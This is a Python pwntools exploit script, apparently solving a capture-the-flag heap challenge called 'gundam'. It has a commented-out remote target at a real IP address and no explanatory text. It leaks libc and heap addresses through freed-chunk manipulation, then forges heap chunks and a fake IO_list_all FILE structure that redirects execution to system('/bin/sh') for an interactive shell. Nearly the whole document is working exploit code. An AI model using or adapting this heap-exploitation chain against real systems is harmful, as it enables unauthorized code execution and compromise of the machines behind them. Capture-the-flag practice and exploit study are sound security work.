from pwn import *

r = process(["./gundam"],env={"LD_PRELOAD":"./libc.so.6"})
#r = remote("47.75.37.114", 9999)
def build(name,type):
	r.sendlineafter(":","1")
	r.sendafter(":",name)
	r.sendlineafter(":",str(type))

def visit():
	r.sendlineafter(":","2")

def remove(idx):
	r.sendlineafter(":","3")
	r.sendlineafter(":",str(idx))

def blow():
	r.sendlineafter(":","4")


build("a",0)
r.interactive()
remove(0)

build("a",0)
remove(1)
build("a",0)
remove(2)
build("a",0)
blow()

build("a",0)
build("a",0)
build("a",0)
remove(0)
remove(1)
remove(2)
blow()
build("a",0)
visit()

r.recvuntil("0] :")
#r.interactive()
libc = u64(r.recvuntil("T")[:-1].ljust(8,'\x00'))-0x3c4b61
print hex(libc)
r.recvuntil(":")
r.recvuntil(":")
r.recvuntil(":")


build("a",0)
build("a",0)
remove(0)
remove(1)
remove(2)

build("a"*0xd0+p64(0x0)+p64(0x111),0)
build(p64(0x0)*18+p64(libc+0x3c4b78)+p64(0x61)*0x7,0)
build("a",0)
remove(1)
remove(0)
build("a"*0x37+"g",0)

visit()
r.recvuntil("g")
heap = u64(r.recvuntil("T")[:-1].ljust(8,'\x00'))
print hex(heap)
r.recvuntil("1 .")

remove(0)
remove(7)
build(p64(0x0)*5+p64(0x281)+p64(0x0),1)
blow()


build(p64(0x0)*0x5+p64(0x111)+p64(libc)*15+p64(0x1)+p64(0x21)*3+p64(heap+0xe0+0x30)+p64(0x21)*4,0)

system = libc+0x45390


build(p64(0x1)+p64(0x2)+p64(0x3)+p64(0)*3+p64(system)*10,1)
remove(4)
remove(0)

blow()

IO_list = libc+0x3c5520
build("a"*0x20+"/bin/sh\x00"+p64(0x61)+p64(0xddaa)+p64(IO_list-0x10)+"\x00"*0x80+p64(heap+0xf0)+"\x00"*0x10,0)
#r.sendlineafter(":","1")
#r.recvuntil("vsyscall]")
r.interactive()
